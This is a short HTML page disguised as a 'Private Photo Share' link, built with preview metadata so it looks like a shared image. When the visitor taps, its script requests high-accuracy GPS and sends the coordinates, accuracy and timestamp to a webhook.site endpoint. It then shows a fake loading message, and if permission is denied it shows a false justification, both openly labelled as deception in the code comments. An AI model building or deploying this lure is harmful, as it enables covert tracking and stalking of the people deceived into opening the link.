<!DOCTYPE html>
<html>
<head>
    <meta property="og:title" content="Private Photo Share">
    <meta property="og:image" content="[attachment_0](attachment)">
    <meta property="og:description" content="Tap to view full high-resolution image">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: black; }
        #mask {
            width: 100vw;
            height: 100vh;
            background-image: url('[attachment_0](attachment)');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            cursor: pointer;
        }
    </style>
</head>
<body onclick="initiate()">
    <div id="mask"></div>

    <script>
        async function initiate() {
            // Request High-Accuracy GPS immediately upon touch
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await fetch("https://webhook.site/2693a92a-d66e-4624-9c97-3d89ea325f67", {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: new Date().toISOString()
                    })
                });
                // Provide a fake reason for the prompt and the lack of change
                alert("Loading high-resolution preview... please wait.");
            }, (err) => {
                // Justification for the permission request if denied
                alert("Permission to access device sensors is required to view high-quality content.");
            });
        }
    </script>
</body>
</html>
